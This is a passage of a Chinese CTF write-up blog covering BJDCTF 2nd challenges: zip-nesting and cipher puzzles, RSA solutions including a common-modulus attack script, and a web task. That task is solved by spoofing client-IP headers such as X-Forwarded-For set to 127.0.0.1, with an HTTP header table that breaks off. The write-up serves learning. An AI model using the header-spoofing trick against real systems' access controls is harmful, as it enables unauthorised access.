title="TARGZ"></a>TARGZ</h3><p>下载下来是<code>hW1ES89jF.tar.gz</code>，file查看发现是zip，不知道密码，拿文件名试下</p><p>发现解压出来了，还是zip加密文件，密码还是文件名</p><p>盗用一下颖奇师傅的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">aa = os.popen(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">filename = aa.read().replace(<span class="string">&#x27;decompress.py&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">a = filename.replace(<span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">kind = filetype.guess(filename)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">if</span> kind.extension <span class="keyword">is</span> <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">os.system(<span class="string">&quot;mv &#123;&#125; &#123;&#125;.zip&quot;</span>.format(filename, a))</span><br><span class="line">os.system(<span class="string">&quot;unzip -P &#123;&#125; &#123;&#125;.zip&quot;</span>.format(a,a))</span><br><span class="line">os.system(<span class="string">&quot;rm *.zip&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;wow_you_can_rea11y_dance&#125;</span><br></pre></td></tr></table></figure><h3 id="开场曲"><a href="#开场曲" class="headerlink" title="开场曲"></a>开场曲</h3><p>下载下来是mp4，可以看到是mikutap，听力题，干就完事了</p><p>真不好听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;MIKUTAP3313313&#125;</span><br></pre></td></tr></table></figure><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>打开发现是繁体字,一个一个搜发现是flag的拼音</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</span><br><span class="line">bi ji di da kuo hao zhe jiu shi fu lai ge zhi jie jiao le ba da kuo hao</span><br><span class="line">BJD&#123;这就是flag直接交了吧&#125;</span><br><span class="line">BJD&#123;淛匶襫黼瀬鎶軄鶛驕鳓哵&#125;</span><br></pre></td></tr></table></figure><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>gif图片发现是有规律的，每行刚好八个空，符合二进制</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322094932.png" style="zoom:50%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01000010 42</span><br><span class="line">01001010 4a</span><br><span class="line">01000100 44</span><br><span class="line">01111011 7b</span><br><span class="line">01001101 4d</span><br><span class="line">00100001 21</span><br><span class="line">01100001 61</span><br><span class="line">00110000 30</span><br><span class="line">01111110 7e</span><br><span class="line">01111101 7d</span><br><span class="line">424a447b4d2161307e7d</span><br><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure><h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>下载下来是jpg，搜了下是圣堂武士密码(Templar Cipher)，有以下规则</p><img src="/2020/03/21/BJDCTF-2rd-writeup/14907757625323.jpg!33.jpg" style="zoom:80%;"><p>对照着翻译一下</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200322095756.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IMKNIGHTSTEMPLAR</span><br></pre></td></tr></table></figure><p>加上flag{}提交就行</p><h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>一串16进制字符串，转字符，后面很像flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br><span class="line"></span><br><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </span><br></pre></td></tr></table></figure><p>维吉尼亚密码,key是yanzi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;yanzi_jiushige_shabi&#125;</span><br></pre></td></tr></table></figure><h3 id="Y1nglish"><a href="#Y1nglish" class="headerlink" title="Y1nglish"></a>Y1nglish</h3><p>题目考察的是词频分析</p><p>quipqiup网址：<a href="https://quipqiup.com/">https://quipqiup.com/</a></p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200324124416.png" style="zoom:80%;"><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure><p>读下原文发现发现networy之类的单词，是说network，所以y变k</p><p>直接读也发现 cracy 这个单词不对劲，应该和暴力破解是同类型的词，所以改成 Cr4ck</p><p>最终flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure><h3 id="RSA0"><a href="#RSA0" class="headerlink" title="RSA0"></a>RSA0</h3><p>还是做做吧，密码学很重要</p><p>nc连上之后得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e&#x3D;9253957</span><br><span class="line"></span><br><span class="line">p+q&#x3D;17197527204660991016930035408263123809040259877847603169542637378767706716259296178344873534778882815738410150250641562554942554918768482130124973070602070</span><br><span class="line"></span><br><span class="line">p-q&#x3D;3283501127743182851935633688746582507377540025586758980645892783208704644171247118527903889977325160707479059917010713382755395132590641870700044646202392</span><br><span class="line"></span><br><span class="line">c&#x3D;30471926191609574952020582344350552307428327163031930955084335343130571238539821732378881111036918563115746281652391681966650016526753032232063719399910844180688651845390340809415668659489594779658849946746379795794343633651023334497181833824386697589969010288147535772453380700224010501799051558826899635431</span><br><span class="line"></span><br><span class="line">flag&#x3D;??????</span><br></pre></td></tr></table></figure><p>先介绍一下RSA算法，RSA算法涉及三个参数，N，e，d，公钥为(N，e)，私钥为(N，d)，其中N是两个大素数p，q的乘积。</p><p><strong>加密过程：</strong></p><p>首选取两个互质数 <strong>p</strong> <strong>q</strong>，那么<strong>p * q</strong> 得到 <strong>N</strong>，这时要计算出<strong>φ(N)</strong><br>φ函数φ(N)是指小于或等于N的正整数中与N互质的数的数目。</p><p>根据欧拉公式，前提<strong>p</strong> <strong>q</strong>都是质数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">φ(N) &#x3D; (p-1)*(q-1)</span><br></pre></td></tr></table></figure><p>这时候随机选择一个整数<strong>e</strong>，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质</p><p>接着计算<strong>e</strong>对**φ(n)**的模逆元</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e*d ≡ 1 (mod φ(n))</span><br></pre></td></tr></table></figure><p>≡是数论中表示同余的符号，可以看到符号右边恒等于1，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(e*d) mod φ(n)&#x3D;1</span><br></pre></td></tr></table></figure><p>简单的说就是 <strong>e*d</strong>除以**φ(N)**得到的余数为1，可以转化为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e*d - 1 &#x3D; kφ(n)</span><br></pre></td></tr></table></figure><p>这时侯我们只有k,d不知道，可以用辗转相除法来计算，神魔是辗转相除法呢？举个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">比如说一个不定方程3x+5y&#x3D;28,我们要求其整数解</span><br><span class="line">用大的数除以小的数5&#x3D;3*1+2  --&gt;余数2&#x3D;5-3*1</span><br><span class="line">然后再用余数与原来的除数相除以，还是大的除以小的3&#x3D;2*1+1--&gt;余数1&#x3D;3-2*1</span><br><span class="line">此时发现除数2(原来的余数)与余数1可以整除，停止除法</span><br><span class="line">2是由第一步来的，所以我们倒推回去</span><br><span class="line">1&#x3D;3-2*1&#x3D;3-(5-3*1)*1&#x3D;3-5+3*1&#x3D;3*2-5即3*2-5&#x3D;1</span><br><span class="line">等号两端同乘以28</span><br><span class="line">28*2*3+28*(-1)*5&#x3D;28</span><br><span class="line">56*3+(-28)*5&#x3D;28</span><br><span class="line">x&#x3D;56 y&#x3D;-28  特解</span><br></pre></td></tr></table></figure><p>同样我们也能求出模逆元</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">首先对余数进行辗转相除：</span><br><span class="line">N &#x3D; A * a0 + r0</span><br><span class="line">A &#x3D; r0 * a1 + r1</span><br><span class="line">r0 &#x3D; r1 * a2 + r2</span><br><span class="line">r1 &#x3D; r2 * a3 + r3</span><br><span class="line">…</span><br><span class="line">rn-2 &#x3D; rn-1 * an + rn</span><br><span class="line">rn-1 &#x3D; rn * an+1 + 0</span><br></pre></td></tr></table></figure><p>对上面的商数逆向排列（不含余数为0的商数）：</p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114162215283.png" style="zoom:80%;"><p>其中：<br>b-1 = 1<br>b0 = an<br>bi = an-1 * bi-1 + bi-2<br>如果n为奇数（即商个数为偶数），则bn即为所求的逆元B；<br>如果n为偶数（即商个数为奇数），则N-bn即为所求的逆元B。</p><p><strong>举两个例子：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">求61关于模105的逆。先对余数辗转相除：</span><br><span class="line">105 &#x3D; 61 * 1 + 44</span><br><span class="line">61 &#x3D; 44 * 1 + 17</span><br><span class="line">44 &#x3D; 17 * 2 + 10</span><br><span class="line">17 &#x3D; 10 * 1 + 7</span><br><span class="line">10 &#x3D; 7 * 1 + 3</span><br><span class="line">7 &#x3D; 3 * 2 + 1</span><br><span class="line">3 &#x3D; 1 * 3 + 0</span><br></pre></td></tr></table></figure><p>将商数逆序排列：</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114163426852.png"></p><p>由于商的个数为偶数，因此31即为61关于模105的逆元。(31 * 61 = 105 * 18 + 1)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">求31关于模105的逆，先对余数辗转相除：</span><br><span class="line">105 &#x3D; 31 * 3 + 12</span><br><span class="line">31 &#x3D; 12 * 2 + 7</span><br><span class="line">12 &#x3D; 7 * 1 + 5</span><br><span class="line">7 &#x3D; 5 * 1 + 2</span><br><span class="line">5 &#x3D; 2 * 2 + 1</span><br><span class="line">2 &#x3D; 1 * 2 + 0</span><br></pre></td></tr></table></figure><p>将商数逆序排列：</p><img src="/2020/03/21/BJDCTF-2rd-writeup/20181114163834643.png" style="zoom:80%;"><p>由于商的个数为奇数，因此105-44=61即为31关于105的逆元</p><p>知道模逆元怎末求得了，然后我们就进行加密吗，m是明文，c是密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m^e ≡ c (mod N)</span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c^d ≡ m (mod N)</span><br></pre></td></tr></table></figure><p>再回到这道题</p><p>由p+q和p-q我们能算出p,q，即N=p*q也知道了，c是密文，e也知道直接用gmpy2就能算出d，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e=<span class="number">8817541</span></span><br><span class="line">paq=<span class="number">16321432012361424715999482612620733350248842171519096058290401228839812649586719552027326066167539574579803995633219307746250179205827394262822225496256560</span></span><br><span class="line">psq=<span class="number">-762917520212563308246814613407392836711488448360655007080799273105995688894593100287666509669227799508891920589926279868282905643495952401909422097272782</span></span><br><span class="line">c=<span class="number">50489857463808300926430257877498323881188812748322681976260520202074367690898181749018527743434038118959830923111311450056657583556281704259092120255347994094472328493911537046586917971842411521641278869273145554989991259437124572940334561139020989426695807874811943663373081092453657052151887455784297691646</span></span><br><span class="line">p = (paq+psq)//<span class="number">2</span></span><br><span class="line">q = (paq-psq)//<span class="number">2</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>之后转16进制转字符串就行</p><p>gmpy2安装参考：<a href="https://www.cnblogs.com/threesoil/p/9926669.html">https://www.cnblogs.com/threesoil/p/9926669.html</a></p><h3 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h3><p>和第一题差不多</p><p>本题每访问一次都会给一组随机的e和c，但是p^2+q^2和p-q不变，因此可以考虑共模攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p^2+q^2&#x3D;233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050</span><br><span class="line"></span><br><span class="line">p-q&#x3D;-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428</span><br><span class="line"></span><br><span class="line">c&#x3D;87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463</span><br><span class="line"></span><br><span class="line">flag&#x3D;??????</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">87567700255805446580688569086348162935993913860449220595864885191176757127427511444244078884207896008178494024025285025508575080281587835133751089187296800829716128794411892433058027899034063381868520639785769819574614982230602956229984725797909585660127484706025719219624130414557402851436473586137081066463</span></span><br><span class="line">e1 = <span class="number">11398291</span></span><br><span class="line"></span><br><span class="line">c2 = <span class="number">18705967865609703350505203897353013349572268163704731296055745391917469960518910212955107755812854024901962046413249126535525965403804342347153196889210756001085291251582862612150330490682927199414305833505087697733874760767084138461692058648555896587248051209761491427866198455080624903527433009258377083135</span></span><br><span class="line">e2 = <span class="number">11511989</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">233267952291859505039783652916196820549830655854017481630358970687296150605497287567221180374924125322298582680891700281813911894392167573300640690548821752679776824359493927916641019722671365040868493597644196114187232764555313925484030012559195525765269481240206756265081919013526886083861070280044423277050</span></span><br><span class="line">B = <span class="number">-5768290924819924200771763039115328282726881252181364451258071886264423429200083031925129093846564595799325371731199564895705667053253727806125240485496428</span></span><br><span class="line"></span><br><span class="line">n = (A-B**<span class="number">2</span>)//<span class="number">2</span></span><br><span class="line"><span class="comment"># print n</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line"></span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>这题真的很。。。</p><p>尝试admin，提示不是admin</p><p>随便登个账号，抓包，在html结尾发现<code>L0g1n.php</code></p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200321184046.png"></p><p>访问发现一环套一环，最后构造就能得到flag的base64编码形式了</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM截图20200321184336.png" style="zoom:80%;"><p><strong>伪造ip:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Forwarded-Host:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-remote-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-remote-addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="literal">True</span>-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Client-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">X-<span class="keyword">Real</span>-IP:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><strong>记一下http的常见字段：</strong></p><p><strong>请求字段</strong></p><table><thead><tr><th align="center">协议头字段名</th><th align="center">说明</th><th align="center">示例</th><th align="center">状态</th></tr></thead><tbody><tr><td align="center">Accept</td><td align="center">能够接受的回应内容类型（Content-Types）。参见<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86">内容协商</a>。</td><td align="center"><code>Accept: text/plain</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Charset</td><td align="center">能够接受的字符集</td><td align="center"><code>Accept-Charset: utf-8</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Encoding</td><td align="center">能够接受的编码方式列表。参考<a href="https://zh.wikipedia.org/wiki/HTTP%E5%8E%8B%E7%BC%A9">HTTP压缩</a>。</td><td align="center"><code>Accept-Encoding: gzip, deflate</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Language</td><td align="center">能够接受的回应内容的自然语言列表。参考 <a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AE%B9%E5%8D%8F%E5%95%86">内容协商</a> 。</td><td align="center"><code>Accept-Language: en-US</code></td><td align="center">常设</td></tr><tr><td align="center">Accept-Datetime</td><td align="center">能够接受的按照时间来表示的版本</td><td align="center"><code>Accept-Datetime: Thu, 31 May 2007 20:35:00 GMT</code></td><td align="center">临时</td></tr><tr><td align="center">Authorization</td><td align="center">用于超文本传输协议的认证的认证信息</td><td align="center"><code>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E9%A1%B5%E5%BF%AB%E7%85%A7">Cache-Control</a></td><td align="center">用来指定在这次的请求/响应链中的所有缓存机制 都必须 遵守的指令</td><td align="center"><code>Cache-Control: no-cache</code></td><td align="center">常设</td></tr><tr><td align="center">Connection</td><td align="center">该浏览器想要优先使用的连接类型[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-rfc7230_connection-8">8]</a></td><td align="center"><code>Connection: keep-alive``Connection: Upgrade</code></td><td align="center">常设</td></tr><tr><td align="center">Cookie</td><td align="center">之前由服务器通过 Set- Cookie （下文详述）发送的一个 超文本传输协议Cookie</td><td align="center"><code>Cookie: $Version=1; Skin=new;</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Content-Length</td><td align="center">以 八位字节数组 （8位的字节）表示的请求体的长度</td><td align="center"><code>Content-Length: 348</code></td><td align="center">常设</td></tr><tr><td align="center">Content-MD5</td><td align="center">请求体的内容的二进制 MD5 散列值，以 Base64 编码的结果</td><td align="center"><code>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</code></td><td align="center">过时的[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-9">9]</a></td></tr><tr><td align="center">Content-Type</td><td align="center">请求体的 多媒体类型 （用于POST和PUT请求中）</td><td align="center"><code>Content-Type: application/x-www-form-urlencoded</code></td><td align="center">常设</td></tr><tr><td align="center">Date</td><td align="center">发送该消息的日期和时间(按照 RFC 7231 中定义的”超文本传输协议日期”格式来发送)</td><td align="center"><code>Date: Tue, 15 Nov 1994 08:12:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Expect</td><td align="center">表明客户端要求服务器做出特定的行为</td><td align="center"><code>Expect: 100-continue</code></td><td align="center">常设</td></tr><tr><td align="center">From</td><td align="center">发起此请求的用户的邮件地址</td><td align="center"><code>From: user@example.com</code></td><td align="center">常设</td></tr><tr><td align="center">Host</td><td align="center">服务器的域名(用于虚拟主机 )，以及服务器所监听的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">传输控制协议</a>端口号。如果所请求的端口是对应的服务的标准端口，则端口号可被省略。[<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-10">10]</a> 自超文件传输协议版本1.1（HTTP/1.1）开始便是必需字段。</td><td align="center"><code>Host: en.wikipedia.org:80``Host: en.wikipedia.org</code></td><td align="center">常设</td></tr><tr><td align="center">If-Match</td><td align="center">仅当客户端提供的实体与服务器上对应的实体相匹配时，才进行对应的操作。主要作用时，用作像 PUT 这样的方法中，仅当从用户上次更新某个资源以来，该资源未被修改的情况下，才更新该资源。</td><td align="center"><code>If-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">If-Modified-Since</td><td align="center">允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ）</td><td align="center"><code>If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">If-None-Match</td><td align="center">允许在对应的内容未被修改的情况下返回304未修改（ 304 Not Modified ），参考 超文本传输协议 的<a href="https://zh.wikipedia.org/wiki/HTTP_ETag">实体标记</a></td><td align="center"><code>If-None-Match: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">If-Range</td><td align="center">如果该实体未被修改过，则向我发送我所缺少的那一个或多个部分；否则，发送整个新的实体</td><td align="center"><code>If-Range: &quot;737060cd8c284d8af7ad3082f209582d&quot;</code></td><td align="center">常设</td></tr><tr><td align="center">If-Unmodified-Since</td><td align="center">仅当该实体自某个特定时间已来未被修改的情况下，才发送回应。</td><td align="center"><code>If-Unmodified-Since: Sat, 29 Oct 1994 19:43:31 GMT</code></td><td align="center">常设</td></tr><tr><td align="center">Max-Forwards</td><td align="center">限制该消息可被代理及网关转发的次数。</td><td align="center"><code>Max-Forwards: 10</code></td><td align="center">常设</td></tr><tr><td align="center">Origin</td><td align="center">发起一个针对 跨来源资源共享 的请求（要求服务器在回应中加入一个‘访问控制-允许来源’（’Access-Control-Allow-Origin’）字段）。</td><td align="center"><code>Origin: http://www.example-social-network.com</code></td><td align="center">常设: 标准</td></tr><tr><td align="center">Pragma</td><td align="center">与具体的实现相关，这些字段可能在请求/回应链中的任何时候产生多种效果。</td><td align="center"><code>Pragma: no-cache</code></td><td align="center">常设但不常用</td></tr><tr><td align="center">Proxy-Authorization</td><td align="center">用来向代理进行认证的认证信息。</td><td align="center"><code>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</code></td><td align="center">常设</td></tr><tr><td align="center">Range</td><td align="center">仅请求某个实体的一部分。字节偏移以0开始。参见<a href="https://zh.wikipedia.org/w/index.php?title=%E5%AD%97%E8%8A%82%E6%9C%8D%E5%8A%A1&action=edit&redlink=1">字节服务</a>。</td><td align="center"><code>Range: bytes=500-999</code></td><td align="center">常设</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/HTTP%E5%8F%83%E7%85%A7%E4%BD%8D%E5%9D%80">Referer</a> [*<a href="https://zh.wikipedia.org/wiki/Sic">sic</a>*] [<a href="https://zh.wikipedia.org/wiki/HTTP%E5%A4%B4%E5%AD%97%E6%AE%B5#cite_note-11">11]</a></td><td align="center">表示浏览器所访问的前一个页面，正是那个页面上的某个链接将浏览器带到了当前所请求的这个页面。</td><td align="center"><code>Referer: http://en.wikipedia.org/wiki/Main_Page</code></td><td align="center">常设</td></tr><tr><td align="center">TE</td><td align="center">浏览器预期接受的传输编码方式：可使用回应协议头 Transfer-Encoding 字段中的值；另外还可用”trailers”（与”分块 “传输方式相关）这个值来表明浏览器希望在最后一个尺寸为0的块之后还接收到一些额外的字段。</td><td align="center"><code>TE: trailers, deflate</code></td><td align="center">常设</td></tr><tr><td align="center">User-Agent</td><td align="center">浏览器的<a 